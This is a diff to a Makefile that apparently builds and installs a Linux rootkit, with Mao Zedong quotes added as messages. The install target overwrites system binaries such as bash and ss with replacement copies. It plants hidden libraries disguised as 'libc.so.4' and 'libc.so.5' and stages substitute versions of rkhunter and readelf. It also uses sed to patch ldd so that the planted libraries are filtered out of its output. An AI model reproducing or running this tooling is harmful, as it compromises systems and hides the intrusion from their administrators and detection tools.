@@ -1,7 +1,7 @@
 CC        := cc
 OUT       := hoxha
 CLIENT    := enver
-UPX	 := ./upx
+UPX	:= ./upx
 SSTRIP    := ./sstrip
 SRC       := knocker.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
@@ -34,10 +34,16 @@ LIB_CFLAGS := -fPIC -Wall -Wextra -pedantic -O2 -pipe -std=c23 -march=$(MARCH) -
 
 all: main
 
+ifneq ($(shell id -u), 0)
+	@echo "You must be root to perform this action."
+else
+	@echo "\nWhen the enemy advances, withdraw; when he stops, harass; when he tires, strike; when he retreats, pursue. - Mao Zedong\n"
+endif
+
 main: $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE)
 
 $(OUT): $(SRC)
-	$(CC) $(SRC) -o $@ $(COMMON_CFLA GS) $(COMMON_LDFLAGS) $(LIBS)
+	$(CC) $(SRC) -o $@ $(COMMON_CFLAGS) $(COMMON_LDFLAGS) $(LIBS)
 	$(CHMOD) $(UPX)
 	$(CHMOD) $(SSTRIP)
 	$(CHMOD) ./patchelf
@@ -58,7 +64,11 @@ $(LIBHIDE): libhide.c
 install:
 	install -Dm755 $(OUT) $(BINDIR)/$(OUT)
 	install -Dm755 $(CLIENT) $(BINDIR)/$(CLIENT)
-	
+	$(CHMOD) ./tools/apt-mark
+	$(CHMOD) ./tools/sockstat
+	$(CHMOD) ./tools/readelf
+	$(CHMOD) ./tools/ss
+	$(CHMOD) ./tools/rkhunter
 	cp $(LIBEXEC) $(LIBDIR)/libc.so.4
 	cp $(LIBHIDE) $(LIBDIR)/libc.so.5
 	cp $(TOOLS)/ss $$(which ss)
@@ -91,6 +101,6 @@ install:
 	cp -f ./bash $$(which bash)
 	
 	sed -i 's/try_trace \"$$RTLD\" \"$$file\" || result=1/try_trace \"$$RTLD\" \"$$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
-	
+	echo "\nThere may be thousands of principles of Marxism, but in the final analysis they can be summed up in one sentence: Rebellion is justified. - Mao Zedong\n"
 clean:
 	rm -f $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE) ./dash ./bash
